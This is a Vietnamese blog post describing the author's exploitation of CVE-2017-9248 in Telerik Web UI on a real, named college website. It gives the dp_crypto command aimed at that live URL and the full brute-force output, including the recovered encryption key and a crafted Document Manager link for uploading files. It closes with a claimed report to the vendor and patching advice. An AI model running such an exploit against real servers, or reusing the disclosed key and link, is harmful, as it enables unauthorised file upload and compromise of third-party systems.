---
title: CVE-2017-9248
date: 25/5/2021
layout: single
header:
  teaser: /assets/images/cve.PNG
--- 

## Khai thác lỗ hổng ứng dụng Web qua Telerik Web Ui trên Framework Asp.Net

[![Language](https://img.shields.io/badge/Lang-Python-blue.svg)](https://www.python.org)


# Giới Thiệu
Khai Thác Lỗ Hổng Của Trường Cao Đẳng Tôi Đang Học 

# Mô Tả 
Chào mọi người, mình xin chia sẻ bài viết phân tích về lỗ hổng trên Telerik Web UI 
Đây là lỗ hổng bảo mật cực kỳ nghiêm trọng, tồn tại do mã hóa yếu trong tệp tin Telerik.Web.UI.dll (Telerik UI for ASP.NET AJAX components). Khai thác lỗ hổng này hacker có thể giải mã ra key (Telerik.Web.UI.DialogParametersEncryptionKey and/or the MachineKey), từ đó có được đường link quản trị nội dung tệp tin và có thể tải tệp tin lên máy chủ nếu cấu hình cho phép (mặc định là cho phép). Lỗ hổng này tồn tại ở các phiên bản từ 2012.3.1308 đến 2017.1.118 (.NET 35, 40, 45).



## Bắt đầu exploit
Để brute telerik bạn có thể sử dụng mã nguồn mở này [công cụ](https://github.com/bao7uo/dp_crypto) này
## Chạy công cụ 
```powershell
python 4.py k -u http://namsaigon.phanmemdaotao.com/telerik.web.ui.dialoghandler.aspx


CVE-2017-9248 - Telerik.Web.UI.dll Cryptographic compromise

Attacking http://namsaigon.phanmemdaotao.com/telerik.web.ui.dialoghandler.aspx
to find key of length [48] with accuracy threshold [9]
using key charset [01234567890ABCDEF]

Key position 01: {6} found with 49 requests, total so far: 49
Key position 02: {8} found with 31 requests, total so far: 80
Key position 03: {3} found with 23 requests, total so far: 103
Key position 04: {F} found with 57 requests, total so far: 160
Key position 05: {7} found with 50 requests, total so far: 210
Key position 06: {9} found with 32 requests, total so far: 242
Key position 07: {4} found with 36 requests, total so far: 278
Key position 08: {9} found with 32 requests, total so far: 310
Key position 09: {F} found with 61 requests, total so far: 371
Key position 10: {6} found with 49 requests, total so far: 420
Key position 11: {5} found with 37 requests, total so far: 457
Key position 12: {2} found with 22 requests, total so far: 479
Key position 13: {6} found with 49 requests, total so far: 528
Key position 14: {0} found with 9 requests, total so far: 537
Key position 15: {E} found with 49 requests, total so far: 586
Key position 16: {D} found with 49 requests, total so far: 635
Key position 17: {6} found with 49 requests, total so far: 684
Key position 18: {1} found with 10 requests, total so far: 694
Key position 19: {2} found with 22 requests, total so far: 716
Key position 20: {7} found with 46 requests, total so far: 762
Key position 21: {F} found with 61 requests, total so far: 823
Key position 22: {2} found with 22 requests, total so far: 845
Key position 23: {C} found with 35 requests, total so far: 880
Key position 24: {5} found with 33 requests, total so far: 913
Key position 25: {1} found with 10 requests, total so far: 923
Key position 26: {5} found with 37 requests, total so far: 960
Key position 27: {1} found with 10 requests, total so far: 970
Key position 28: {2} found with 22 requests, total so far: 992
Key position 29: {C} found with 35 requests, total so far: 1027
Key position 30: {F} found with 61 requests, total so far: 1088
Key position 31: {4} found with 36 requests, total so far: 1124
Key position 32: {7} found with 46 requests, total so far: 1170
Key position 33: {C} found with 35 requests, total so far: 1205
Key position 34: {D} found with 48 requests, total so far: 1253
Key position 35: {5} found with 37 requests, total so far: 1290
Key position 36: {5} found with 33 requests, total so far: 1323
Key position 37: {8} found with 31 requests, total so far: 1354
Key position 38: {2} found with 22 requests, total so far: 1376
Key position 39: {1} found with 10 requests, total so far: 1386
Key position 40: {2} found with 22 requests, total so far: 1408
Key position 41: {7} found with 50 requests, total so far: 1458
Key position 42: {1} found with 10 requests, total so far: 1468
Key position 43: {6} found with 49 requests, total so far: 1517
Key position 44: {6} found with 45 requests, total so far: 1562
Key position 45: {9} found with 31 requests, total so far: 1593
Key position 46: {F} found with 61 requests, total so far: 1654
Key position 47: {4} found with 36 requests, total so far: 1690
Key position 48: {8} found with 31 requests, total so far: 1721
Found 48 of 48 key characters: (ASCII hex) 363833463739343946363532363045443631323746324335313531324346343743443535383231323731363639463438
Total web requests: 1721
http://namsaigon.phanmemdaotao.com/telerik.web.ui.dialoghandler.aspx?DialogName=DocumentManager&renderMode=2&Skin=Default&Title=Document%20Manager&dpptn=&isRtl=false&dp=ZG8GLm5UTFUXbnsHVF0LElV2SkEfZRJGY1h3QSB0YUQOPU1gW1xnXngBZFpbAWIIbG5xLlN+XEMKcGdLUmcQN3tySlYkZQ4AZHN/BiEQRAEOAF4CamUEWm5cTlprEQVRbG9hLW1uZnofbnteYwMXcVR2ZE0ndRVZVXZJdRoRTE0ZF0JPdHRjS1NmYwFsK2JNbH9lP2NuDVIcZU11b2c9PmxiRU4KdgoCZ21zQSF0clwWA3MFWXp8QWF5fAdjFUNPen5DMm5DWGgTYQ0LeQELKG9peF0ndAFdVX1jXiArAU0PAmdMXGVkQXpyTmJ0K0dPbwl2f2dtQH8kW3NbVHcTAlRmeFscdRFZa3N/QCIRAU0PAW9dWnp/Xnt1e0VvDn4JbGxHCG5hXG8lcU1Eb2cXA1dmSlsTAC8Da2ZJdRoRTE0ZF0JNdHZ4RXl1UUF0AkB1VAp9LlV+WA8fbmdCVAJwFW9pYFgKdxldU31/Xg8CdUQMdG9FWnVncVRcDwVadGJBZwoKM1N+YkwicHdLVAMfNGx2ZE4Qei9Ca2AEWiERYUQRKXNGWwBkQXpyQQFvK1hUUglxLlN+XEMKcGdLUmcQN3tySlYkZQ4AZHN3RBMSQH0gdXtHWWUEZ1UCYFxYBUx/b29LPG1qQ0MKc29aVHgLKHkBZAMidRVMU1h3QREBWF8hAwxbWwNzWlN2UUVrK3JLVQpmNXp6Qw4ScXNHbAMTLGwDZ0QUXwVGUgdkQQ4FTFYVPmcFbl5rfGdlQmNjEUxUVVVfNHtSZkkfYU1EbAAXKGxcXkInahFFUwcFRxEBWF8hAwxbbnpdRW1kA15bEWFLZFV1NVQLYUoLdU1lZAEfPmFdWnwldQUAf2NZUxV2WAYVKGNHXGR7amJfdF1rPFgNYn9HFVR/WGEjfm9Te3Vwdm9cB2QjZQpMVH1BfyJ3fgUUEHtiXHRBanlldGNvdm4JYW5XLVV+eksTWHdoYAMtdmFfXgQcAxl9Z1t/UxQDREAaHF4Eb3RBamRpYGFvEUBCZW1pJ1V+ekwSWHdbe1oUcWJmQnUjd3Jhf31BfyItYgMXEmdjWwJddGNbcF9qAH1AbwoCEHhufk0QXHNZZXU1K29afAQcAxV8Z1hdWxF0TEYWPn9idmRrenhpfFdvPGUNYm5hDFJ/RE0UW019U10hcGJcQmAnZC9gZVhFfRISBA4MdHNGWnUIAWNpYEVdAVhPVH9lEm1uTFUfBWdCVAJxN2RcdEQlABZGfExJdRoRTE0ZFQgI
```

![](https://www10.0zz0.com/2022/06/10/14/557837570.png)
## Và chúng ta có thể up tất cả mọi thứ lên trên này :D

## Cái Kết 
Tôi đã báo cáo lỗi này đến công ty phát triển phần mềm của trường :))

![](https://www13.0zz0.com/2022/06/10/14/164886149.png)

Sau hơn 1 năm báo cáo cuối cùng lỗi này đã được khắc phục :))

![](https://www13.0zz0.com/2022/06/10/15/894737972.png)

## Cách khắc phục
Cài đặt bản vá lỗ hổng bảo mật tại [đây](https://www.telerik.com/)
Tiến hành upgrade bản vá theo hướng 
Tạo các khóa duy nhất cho Telerick.Web.UI.DialogParameterEncodingKey và MachineKey trong web.config hoặc dùng trình tạo khóa của IIS machine Key
Thực hiện Redirect url trả lại trang thông báo lỗi khi hacker truy cập Telerik



## Nhớ đừng làm gì xấu với công cụ này nhé :D

